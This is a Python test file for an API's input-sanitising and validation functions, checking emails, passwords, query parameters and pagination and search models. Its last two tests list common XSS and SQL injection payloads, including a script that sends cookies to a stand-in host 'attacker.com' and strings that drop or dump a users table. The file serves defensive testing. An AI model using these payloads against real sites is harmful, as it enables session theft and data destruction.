import pytest
from fastapi import HTTPException, status
from infrastructure.api.query_validation import (
    sanitize_string,
    validate_email,
    validate_password,
    validate_query_param,
    PaginationQueryParams,
    SearchQueryParams
)

def test_sanitize_string():
    """Test the sanitize_string function."""
    # Test with normal string
    assert sanitize_string("hello world") == "hello world"
    
    # Test with dangerous characters
    assert sanitize_string("hello<script>alert('xss')</script>world") == "helloscriptalertxssscriptworld"
    assert sanitize_string("hello'world") == "helloworld"
    assert sanitize_string('hello"world') == "helloworld"
    assert sanitize_string("hello;world") == "helloworld"
    assert sanitize_string("hello`world") == "helloworld"
    assert sanitize_string("hello(world)") == "helloworld"
    
    # Test with empty string
    assert sanitize_string("") == ""
    
    # Test with None
    assert sanitize_string(None) == None

def test_validate_email():
    """Test the validate_email function."""
    # Test with valid email
    assert validate_email("user@example.com") == "user@example.com"
    
    # Test with dangerous characters
    with pytest.raises(HTTPException) as excinfo:
        validate_email("user<script>@example.com")
    assert excinfo.value.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
    
    # Test with invalid email format
    with pytest.raises(HTTPException) as excinfo:
        validate_email("not-an-email")
    assert excinfo.value.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
    
    # Test with empty email
    with pytest.raises(HTTPException) as excinfo:
        validate_email("")
    assert excinfo.value.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

def test_validate_password():
    """Test the validate_password function."""
    # Test with valid password
    assert validate_password("password123") == "password123"
    
    # Test with dangerous characters
    assert validate_password("password<script>alert('xss')</script>123") == "passwordscriptalertxssscript123"
    
    # Test with short password
    with pytest.raises(HTTPException) as excinfo:
        validate_password("short")
    assert excinfo.value.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
    
    # Test with empty password
    with pytest.raises(HTTPException) as excinfo:
        validate_password("")
    assert excinfo.value.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

def test_validate_query_param():
    """Test the validate_query_param function."""
    # Test with valid parameter
    assert validate_query_param("value", "param") == "value"
    
    # Test with dangerous characters
    assert validate_query_param("value<script>alert('xss')</script>", "param") == "valuescriptalertxssscript"
    
    # Test with empty parameter (required)
    with pytest.raises(HTTPException) as excinfo:
        validate_query_param("", "param")
    assert excinfo.value.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
    
    # Test with empty parameter (not required)
    assert validate_query_param("", "param", required=False) == ""
    
    # Test with minimum length
    with pytest.raises(HTTPException) as excinfo:
        validate_query_param("abc", "param", min_length=5)
    assert excinfo.value.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
    
    # Test with maximum length
    with pytest.raises(HTTPException) as excinfo:
        validate_query_param("abcdefghijk", "param", max_length=5)
    assert excinfo.value.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
    
    # Test with pattern
    assert validate_query_param("abc123", "param", pattern=r'^[a-z0-9]+$') == "abc123"
    with pytest.raises(HTTPException) as excinfo:
        validate_query_param("abc-123", "param", pattern=r'^[a-z0-9]+$')
    assert excinfo.value.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
    
    # Test with custom validator
    def custom_validator(value):
        if value != "expected":
            raise ValueError("Value must be 'expected'")
        return value
    
    assert validate_query_param("expected", "param", custom_validator=custom_validator) == "expected"
    with pytest.raises(HTTPException) as excinfo:
        validate_query_param("unexpected", "param", custom_validator=custom_validator)
    assert excinfo.value.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

def test_pagination_query_params():
    """Test the PaginationQueryParams model."""
    # Test with valid parameters
    params = PaginationQueryParams(page=1, size=50, sort_by="created_at:desc")
    assert params.page == 1
    assert params.size == 50
    assert params.sort_by == "created_at:desc"
    
    # Test with invalid page
    with pytest.raises(ValueError):
        PaginationQueryParams(page=0, size=50)
    
    # Test with invalid size
    with pytest.raises(ValueError):
        PaginationQueryParams(page=1, size=0)
    with pytest.raises(ValueError):
        PaginationQueryParams(page=1, size=101)
    
    # Test with invalid sort_by
    with pytest.raises(ValueError):
        PaginationQueryParams(page=1, size=50, sort_by="created_at:invalid")
    
    # Test with dangerous characters in sort_by
    params = PaginationQueryParams(page=1, size=50, sort_by="created_at<script>:desc")
    assert params.sort_by == "created_atscript:desc"

def test_search_query_params():
    """Test the SearchQueryParams model."""
    # Test with valid parameters
    params = SearchQueryParams(q="search term", fields="name,description")
    assert params.q == "search term"
    assert params.fields == "name,description"
    
    # Test with empty q
    with pytest.raises(ValueError):
        SearchQueryParams(q="", fields="name,description")
    
    # Test with dangerous characters in q
    params = SearchQueryParams(q="search<script>alert('xss')</script>term", fields="name,description")
    assert params.q == "searchscriptalertxssscriptterm"
    
    # Test with dangerous characters in fields
    params = SearchQueryParams(q="search term", fields="name<script>,description")
    assert params.fields == "namescript,description"
    
    # Test with invalid field name
    with pytest.raises(ValueError):
        SearchQueryParams(q="search term", fields="name,description-invalid")

def test_xss_injection_attempts():
    """Test that XSS injection attempts are properly sanitized."""
    # Common XSS payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "';alert('XSS');//",
        "\"><script>alert('XSS')</script>",
        "<script>document.location='http://attacker.com/cookie.php?c='+document.cookie</script>"
    ]
    
    for payload in xss_payloads:
        # Test sanitize_string
        sanitized = sanitize_string(payload)
        assert "<script>" not in sanitized
        assert "alert" not in sanitized or "alert('XSS')" not in sanitized
        
        # Test validate_query_param
        sanitized = validate_query_param(payload, "param", required=False)
        assert "<script>" not in sanitized
        assert "alert" not in sanitized or "alert('XSS')" not in sanitized
        
        # Test with email validation (should fail for most payloads)
        if "@" in payload:  # Only test if it looks remotely like an email
            with pytest.raises(HTTPException):
                validate_email(payload)

def test_sql_injection_attempts():
    """Test that SQL injection attempts are properly sanitized."""
    # Common SQL injection payloads
    sql_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users; --",
        "admin'--",
        "1; SELECT * FROM users",
        "1' OR '1' = '1' --"
    ]
    
    for payload in sql_payloads:
        # Test sanitize_string
        sanitized = sanitize_string(payload)
        assert "'" not in sanitized
        assert ";" not in sanitized
        
        # Test validate_query_param
        sanitized = validate_query_param(payload, "param", required=False)
        assert "'" not in sanitized
        assert ";" not in sanitized